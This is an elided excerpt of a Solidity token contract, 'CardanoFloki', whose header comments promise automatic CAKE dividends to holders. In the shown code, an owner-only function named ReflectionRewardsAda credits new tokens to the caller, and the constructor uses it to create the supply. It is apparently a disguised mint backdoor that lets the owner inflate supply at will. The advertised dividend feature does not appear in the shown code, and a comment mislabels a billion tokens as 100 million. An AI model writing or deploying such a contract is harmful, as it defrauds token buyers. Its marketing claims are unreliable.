...
//
// $CardanoFloki proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
// simply hold$CardanoFloki and you'll receive CAKE automatically in your wallet.
// 
// Hold CardanoFloki and get rewarded in Cake on every transaction!
//
//
// 📱 Telegram: https://t.me/cardanofloki
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflectionRewardsAda(uint256 amount) public onlyOwner {
    _ReflectionRewardsAda(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsAda(address account, uint256 amount) internal virtual {
...
contract CardanoFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cardano Floki  ", "CRF") {
        _ReflectionRewardsAda(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}